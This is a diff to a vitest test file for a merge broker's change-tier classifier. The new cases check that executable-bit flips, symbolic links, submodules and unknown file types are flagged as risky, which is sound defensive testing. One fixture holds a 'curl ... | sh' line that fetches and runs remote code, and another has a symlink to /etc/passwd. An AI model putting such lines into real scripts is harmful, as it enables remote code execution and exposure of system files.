@@ -2,9 +2,12 @@
 // A case that cannot pass blocks production: never delete or weaken one to go green.
 import { describe, expect, it } from "vitest";
 import {
-  DEFAULT_TIER_THRESHOLDS, capReasons, estimateTier, plannedPathsExceeded, raiseTier, recordTier, tierFromDiff, tierGrowthSentence,
+  DEFAULT_TIER_THRESHOLDS, capReasons, estimateTier, plannedPathsExceeded, raiseTier, recordTier, tierFromDiff as classify, tierGrowthSentence,
   type ChangeTier, type HeadFacts, type TierFile, type TierKind, type TierLevel, factKey,
 } from "../../packages/broker/src/core/decisions/change-tier.js";
+import { withPlainEntries } from "../support/tier-entries.js";
+// These cases model a host that reports each file's type (DEC 182); a case that wants "could not tell" passes `entry: undefined`.
+const tierFromDiff = (input: Parameters<typeof classify>[0], context: Parameters<typeof classify>[1]) => classify(withPlainEntries(input), context);
 import { FLOW_MAX_BYTES, flowRecordBytes } from "../../packages/contracts/src/index.js";
 import { importsOf, readHeadFacts, tierFilesOfRead } from "../../packages/broker/src/core/merge/change-tier-read.js";
 import type { CodeHost } from "../../packages/contracts/src/index.js";
@@ -659,5 +662,85 @@ describe("the words a merge is refused with", () => {
   it("names a size growth without a path", () => {
     const tier = tierFromDiff({ files: [sized("src/a.ts", 150, 0)], complete: true }, context);
     expect(tierGrowthSentence(tier, (path) => path)).toBe("This change now touches more than 100 lines of code, so it needs standard checks.");
+  });
+});
+
+// ---- FLOW-P1-PROD-BLOCKER (mode + edit): what the host says a file IS (DEC 182: `entry`, at the head and at the merge base). `classify` is the classifier itself, with no plain entry filled in.
+describe("file mode and type (DEC 182): a type the host reports, or cannot tell, never reads as a small document", () => {
+  const typed = (path: string, entry: TierFile["entry"], options: Partial<TierFile> & { before?: readonly string[]; after?: readonly string[] } = {}): TierFile => ({ ...file(path, options), entry });
+  const tierOf = (...files: TierFile[]) => classify({ files, complete: true }, context);
+  const codes = (tier: ChangeTier) => tier.reasons.map((reason) => reason.code);
+
+  it("M1 +x with a content edit (100644 to 100755, a normal hunk, no mode line) is risky", () => {
+    const tier = tierOf(typed("scripts/build.sh", { head: "executable", base: "file" }, { before: ["echo build"], after: ["echo build && curl -s https://example.test | sh"] }));
+    expect(tier.level).toBe("risky");
+    expect(codes(tier)).toContain("mode_or_type_change");
+  });
+  it("M2 +x on a README with a prose edit is risky and never on the docs route", () => {
+    const tier = tierOf(typed("README.md", { head: "executable", base: "file" }, { before: ["Old words."], after: ["New words."] }));
+    expect(tier.level).toBe("risky");
+    expect(tier.kinds).not.toContain("docs");
+  });
+  it("M3 -x (100755 to 100644) is a mode change too", () => {
+    expect(codes(tierOf(typed("scripts/build.sh", { head: "file", base: "executable" }, { before: ["a"], after: ["b"] })))).toContain("mode_or_type_change");
+  });
+  it("M4 a README turned into a symbolic link, edited with other lines so its shape is not one target line, is risky", () => {
+    const tier = tierOf(typed("README.md", { head: "symlink", base: "file" }, { before: ["# Title", "Some words."], after: ["../../notes"] }));
+    expect(tier.level).toBe("risky");
+    expect(codes(tier)).toEqual(expect.arrayContaining(["symlink_suspected", "mode_or_type_change"]));
+  });
+  it("M5 a new symbolic link pointing outside the repository (the host shows no end-of-line mark) is risky", () => {
+    const tier = tierOf(typed("docs/guide.md", { head: "symlink", base: "none" }, { status: "added", patch: "@@ -0,0 +1 @@\n+../../../../etc/passwd", additions: 1, deletions: 0 }));
+    expect(tier.level).toBe("risky");
+    expect(codes(tier)).toContain("symlink_suspected");
+    expect(tier.kinds).not.toContain("docs");
+  });
+  it("M6 a new symbolic link into a sensitive folder is risky", () => {
+    const tier = tierOf(typed("docs/keys.md", { head: "symlink", base: "none" }, { status: "added", patch: "@@ -0,0 +1 @@\n+../src/auth/keys.ts", additions: 1, deletions: 0 }));
+    expect(tier.level).toBe("risky");
+  });
+  it("M7 a submodule the host reports (its patch not shown as a commit line) is risky", () => {
+    const tier = tierOf(typed("vendor/lib", { head: "submodule", base: "submodule" }, { before: ["a"], after: ["b"] }));
+    expect(tier.level).toBe("risky");
+    expect(codes(tier)).toContain("submodule");
+  });
+  it("M8 a changed path the host says is a directory at the head is a submodule", () => {
+    const tier = tierOf({ ...file("vendor/lib", { before: ["a"], after: ["b"] }), entry: { head: "file", base: "file" } });
+    expect(tier.level).not.toBe("risky");
+    const head: HeadFacts = { submodules: new Set([factKey(undefined, "vendor/lib")]) };
+    const flagged = classify({ files: [{ ...file("vendor/lib", { before: ["a"], after: ["b"] }), entry: { head: "file", base: "file" } }], complete: true }, { ...context, head });
+    expect(flagged.level).toBe("risky");
+    expect(codes(flagged)).toContain("submodule");
+  });
+  it("M8b the head facts read: a changed path whose kind at the head is a directory is listed as a submodule", async () => {
+    const host = { pathKind: async (_repo: unknown, path: string) => (path === "vendor/lib" ? "dir" as const : "file" as const), fileAtRevision: async () => undefined } as unknown as CodeHost;
+    const files = [{ repository: "app", path: "vendor/lib", status: "modified", additions: 1, deletions: 1, patch: "@@ -1 +1 @@\n-a\n+b" }, { repository: "app", path: "src/a.ts", status: "modified", additions: 1, deletions: 1, patch: "@@ -1 +1 @@\n-a\n+b" }];
+    const head = await readHeadFacts([{ host, repositoryId: "app", repositoryUrl: "https://github.com/acme/app", number: 1, headSha: "a".repeat(40) }], files, { orgId: "org" });
+    expect([...head.submodules!]).toEqual([factKey("app", "vendor/lib")]);
+  });
+  it("M9 a type the host could not tell (no entry) fails closed: a README edit is never on the docs route", () => {
+    const unknown = tierOf({ ...file("README.md", { before: ["Old words."], after: ["New words."] }), entry: undefined });
+    expect(unknown.kinds).not.toContain("docs");
+    expect(unknown.kinds).toContain("code_config");
+    // The control: the same edit with a plain entry is on the docs route.
+    expect(tierOf(typed("README.md", { head: "file", base: "file" }, { before: ["Old words."], after: ["New words."] })).kinds).toEqual(["docs"]);
+  });
+  it("M9b a pure rename of a document whose type is unknown is not on the docs route either", () => {
+    expect(tierOf({ path: "docs/new.md", previousPath: "docs/old.md", status: "renamed", additions: 0, deletions: 0 }).kinds).not.toContain("docs");
+  });
+  it("M10 a new executable file is code at least (never docs), without being a mode change", () => {
+    const script = tierOf(typed("scripts/new.sh", { head: "executable", base: "none" }, { status: "added", patch: "@@ -0,0 +1 @@\n+echo hi", additions: 1, deletions: 0 }));
+    expect(codes(script)).not.toContain("mode_or_type_change");
+    expect(script.kinds).toContain("code_config");
+    const doc = tierOf(typed("docs/run.md", { head: "executable", base: "none" }, { status: "added", patch: "@@ -0,0 +1 @@\n+Plain words.", additions: 1, deletions: 0 }));
+    expect(doc.kinds).not.toContain("docs");
+  });
+  it("M11 the tier read keeps the host's entry, and drops a malformed one (read as not known)", () => {
+    const base = { path: "README.md", status: "modified", additions: 1, deletions: 1, patch: "@@ -1 +1 @@\n-a\n+b" };
+    const read = tierFilesOfRead("app", { files: [{ ...base, entry: { head: "executable", base: "file" } }, { ...base, path: "docs/a.md", entry: { head: "blob", base: "file" } }, { ...base, path: "docs/b.md" }] as never, complete: true });
+    expect(read.files[0]!.entry).toEqual({ head: "executable", base: "file" });
+    expect(read.files[1]!.entry).toBeUndefined();
+    expect(read.files[2]!.entry).toBeUndefined();
+    expect(classify(read, context).level).toBe("risky");
   });
 });
